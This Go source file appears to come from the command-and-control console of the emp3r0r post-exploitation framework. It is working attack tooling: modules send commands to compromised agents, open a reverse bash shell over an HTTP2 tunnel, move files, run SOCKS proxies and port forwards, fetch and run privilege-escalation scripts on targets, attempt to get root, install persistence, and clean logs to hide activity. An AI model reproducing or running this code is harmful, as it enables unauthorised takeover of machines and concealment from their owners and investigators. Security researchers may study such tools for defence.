package cc

import (
	"context"
	"fmt"
	"io"
	"strconv"
	"strings"
	"time"

	"github.com/bettercap/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

// Option all necessary info of an option
type Option struct {
	Name string   // like `module`, `target`, `cmd_to_exec`
	Val  string   // the value to use
	Vals []string // possible values
}

var (
	// CurrentMod selected module
	CurrentMod = "<blank>"

	// CurrentTarget selected target
	CurrentTarget *agent.SystemInfo

	// Options currently available options for `set`
	Options = make(map[string]*Option)

	// ShellHelpInfo provide utilities like ps, kill, etc
	ShellHelpInfo = map[string]string{
		"bash":  "A reverse bash shell from HTTP2 tunnel, press Ctrl-D to leave",
		"#ps":   "List processes: `#ps`",
		"#kill": "Kill process: `#kill <PID>`",
		"#put":  "Put a file from CC to agent: `#put <local file> <remote path>`",
		"#get":  "Get a file from agent: `#get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		"cmd":         moduleCmd,
		"shell":       moduleShell,
		"proxy":       moduleProxy,
		"port_fwd":    modulePortFwd,
		"lpe_suggest": moduleLPE,
		"get_root":    moduleGetRoot,
		"clean_log":   moduleLogCleaner,
		"persistence": modulePersistence,
	}
)

// SetOption set an option to value, `set` command
func SetOption(args []string) {
	if len(args) < 2 {
		return
	}

	opt := args[0]
	val := args[1:] // in case val contains spaces

	if _, exist := Options[opt]; !exist {
		CliPrintError("No such option: %s", strconv.Quote(opt))
		return
	}

	// set
	Options[opt].Val = strings.Join(val, " ")
}

// UpdateOptions add new options according to current module
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		CliPrintError("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new Option to Options, if exists, return the *Option
	addIfNotFound := func(key string) *Option {
		if _, exist := Options[key]; !exist {
			Options[key] = &Option{Name: key, Val: "<blank>", Vals: []string{}}
		}
		return Options[key]
	}

	var currentOpt *Option
	switch {
	case modName == "cmd":
		currentOpt = addIfNotFound("cmd_to_exec")
		currentOpt.Vals = []string{
			"id", "whoami", "ifconfig",
			"ip a", "arp -a",
			"ps -ef", "lsmod", "ss -antup",
			"netstat -antup", "uname -a",
		}

	case modName == "port_fwd":
		// rport
		portOpt := addIfNotFound("to")
		portOpt.Vals = []string{"127.0.0.1:22", "127.0.0.1:8080"}
		// listen on port
		lportOpt := addIfNotFound("listen_port")
		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
		// on/off
		switchOpt := addIfNotFound("switch")
		switchOpt.Vals = []string{"on", "off"}
		switchOpt.Val = "on"

	case modName == "clean_log":
		// keyword to clean
		keywordOpt := addIfNotFound("keyword")
		keywordOpt.Vals = []string{"root", "admin"}

	case modName == "proxy":
		portOpt := addIfNotFound("port")
		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
		portOpt.Val = "8080"
		statusOpt := addIfNotFound("status")
		statusOpt.Vals = []string{"on", "off"}
		statusOpt.Val = "on"

	case modName == "lpe_suggest":
		currentOpt = addIfNotFound("lpe_helper")
		currentOpt.Vals = []string{"lpe_les", "lpe_upc"}
		currentOpt.Val = "lpe_les"

	case modName == "persistence":
		currentOpt = addIfNotFound("method")
		methods := make([]string, len(agent.PersistMethods))
		i := 0
		for k := range agent.PersistMethods {
			methods[i] = k
			i++
		}
		currentOpt.Vals = methods
		currentOpt.Val = "all"
	}

	return
}

// ModuleRun run current module
func ModuleRun() {
	if CurrentTarget == nil {
		CliPrintError("Target not set, try `target 0`?")
		return
	}
	if Targets[CurrentTarget] == nil {
		CliPrintError("Target not exist, type `info` to check")
		return
	}

	mod := ModuleHelpers[CurrentMod]
	if mod != nil {
		mod()
	} else {
		CliPrintError("Module '%s' not found", CurrentMod)
	}
}

// moduleShell like moduleCmd, but interactive, like all shells do
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// send data
	var data agent.MsgTunData
	CliPrintInfo("\nEntering shell of agent[%d] ...\n"+
		"Note: Use `bash` command to start a bash reverse shell, type `help` for more info",
		tControl.Index)

shell:
	for {
		// set prompt to shell
		EmpReadLine.SetPrompt(color.HiMagentaString("shell [%d] > ", tControl.Index))
		defer EmpReadLine.SetPrompt(color.CyanString("emp3r0r > "))

		// read user input
		input, err := EmpReadLine.Readline()
		if err != nil {
			if err == readline.ErrInterrupt {
				if len(input) == 0 {
					break
				} else {
					continue
				}
			} else if err == io.EOF {
				break
			}
			CliPrintError("Error: %v", err)
			break
		}

		input = strings.TrimSpace(input)
		inputSlice := strings.Fields(input)

		// deal with input
		switch {
		case input == "exit":
			break shell
		case input == "":
			continue shell
		case input == "help":
			CliPrettyPrint("Helper", "Usage", &ShellHelpInfo)
			continue shell

		case input == "bash":
			// activate reverse shell in agent
			token := uuid.New().String()
			RShellStream.Text = token
			cmd := fmt.Sprintf("bash %s", token)
			err := SendCmd(cmd, CurrentTarget)
			if err != nil {
				CliPrintError("Cannot activate reverse shell on remote target: ", err)
				return
			}
			// wait for agent to send shell
			for {
				if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
					break
				}
				time.Sleep(200 * time.Millisecond)
			}

			// launch local terminal to use remote bash shell
			send := make(chan []byte)
			reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
			time.Sleep(1 * time.Second)
			break shell

		case inputSlice[0] == "#put":
			// #put file to agent
			if len(inputSlice) != 3 {
				CliPrintError("#put <local path> <remote path>")
				continue shell
			}

			if err = PutFile(inputSlice[1], inputSlice[2], target); err != nil {
				CliPrintError("Cannot put %s: %v", inputSlice[2], err)
			}
			continue shell

		case inputSlice[0] == "vim":

			if len(inputSlice) < 2 {
				CliPrintError("What file do you want to edit?")
				continue shell
			}
			filepath := inputSlice[1]
			filename := FileBaseName(filepath)

			// tell user what to do
			color.HiBlue("[*] Now edit %s in vim window",
				filepath)

			// edit remote files
			if GetFile(filepath, target) != nil {
				CliPrintError("Cannot download %s", filepath)
				continue shell
			}

			if err = VimEdit(FileGetDir + filename); err != nil {
				CliPrintError("VimEdit: %v", err)
				continue shell
			} // wait until vim exits

			// upload the new file to target
			if PutFile(FileGetDir+filename, filepath, target) != nil {
				CliPrintError("Cannot upload %s", filepath)
			}
			continue shell
		default:
		}

		// send command
		data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, input)
		data.Tag = target.Tag
		err = Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleShell: %v", err)
		}
	}
	CliPrintSuccess("\n[*] shell[%d] finished", tControl.Index)
}

// moduleCmd exec cmd on target
func moduleCmd() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleCmd: Target does not exist")
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	if Targets[target].Conn == nil {
		CliPrintError("moduleCmd: agent is not connected")
		return
	}

	// send data
	var data agent.MsgTunData
	data.Payload = "cmd" + agent.OpSep + Options["cmd_to_exec"].Val
	data.Tag = target.Tag
	err := Send2Agent(&data, target)
	if err != nil {
		CliPrintError("moduleCmd: %v", err)
	}
}

func modulePortFwd() {
	switch Options["switch"].Val {
	case "off":
		for id, session := range PortFwds {
			if session.Description == fmt.Sprintf("%s (Local) -> %s (Agent)",
				Options["listen_port"].Val,
				Options["to"].Val) {
				session.Cancel() // cancel the PortFwd session

				// tell the agent to close connection
				// make sure handler returns
				cmd := fmt.Sprintf("!port_fwd %s stop", id)
				err := SendCmd(cmd, CurrentTarget)
				if err != nil {
					CliPrintError("SendCmd: %v", err)
					return
				}
			}
		}
	default:
		var pf PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = Options["listen_port"].Val, Options["to"].Val
		go func() {
			err := pf.RunPortFwd()
			if err != nil {
				CliPrintError("PortFwd failed: %v", err)
			}
		}()
	}
}

func moduleProxy() {
	// proxy
	proxyCtx, proxyCancel := context.WithCancel(context.Background())
	port := Options["port"].Val
	status := Options["status"].Val

	// port-fwd
	var pf PortFwdSession
	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
	pf.Lport, pf.To = port, port

	// proxy command, start socks5 server on agent
	go func() {
		if _, err := strconv.Atoi(port); err != nil {
			CliPrintError("Invalid port: %v", err)
			return
		}
		cmd := fmt.Sprintf("!proxy %s %s", status, port)
		err := SendCmd(cmd, CurrentTarget)
		if err != nil {
			CliPrintError("SendCmd: %v", err)
			return
		}
		defer proxyCancel() // mark proxy command as done
	}()

	switch status {
	case "on":
		// port mapping
		go func() {
			for proxyCtx.Err() == nil {
				time.Sleep(100 * time.Millisecond)
			}

			err := pf.RunPortFwd()
			if err != nil {
				CliPrintError("PortFwd failed: %v", err)
			}
		}()
	case "off":
		for id, session := range PortFwds {
			if session.Description == fmt.Sprintf("%s (Local) -> %s (Agent)",
				port,
				port) {
				session.Cancel() // cancel the PortFwd session

				// tell the agent to close connection
				// make sure handler returns
				cmd := fmt.Sprintf("!port_fwd %s stop", id)
				err := SendCmd(cmd, CurrentTarget)
				if err != nil {
					CliPrintError("SendCmd: %v", err)
					return
				}
			}
		}
	default:
		CliPrintError("Unknown operation '%s'", status)
	}
}

func moduleLPE() {
	const (
		lesURL = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
		upcURL = "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check"
	)
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}

	// download third-party LPE helper
	CliPrintInfo("Updating local LPE helpers...")
	err := Download(lesURL, Temp+tun.FileAPI+"lpe_les")
	if err != nil {
		CliPrintWarning("Failed to download LES: %v", err)
		return
	}
	err = Download(upcURL, Temp+tun.FileAPI+"lpe_upc")
	if err != nil {
		CliPrintWarning("Failed to download LES: %v", err)
		return
	}

	// exec
	CliPrintInfo("This can take some time, please be patient")
	cmd := "!" + Options["lpe_helper"].Val
	CliPrintInfo("Running " + cmd)
	err = SendCmd(cmd, target)
	if err != nil {
		CliPrintError("Run %s: %v", cmd, err)
	}
}

func moduleGetRoot() {
	err := SendCmd("!get_root", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}

func modulePersistence() {
	cmd := fmt.Sprintf("!persistence %s", Options["method"].Val)
	err := SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}

func moduleLogCleaner() {
	cmd := fmt.Sprintf("!clean_log %s", Options["keyword"].Val)
	err := SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
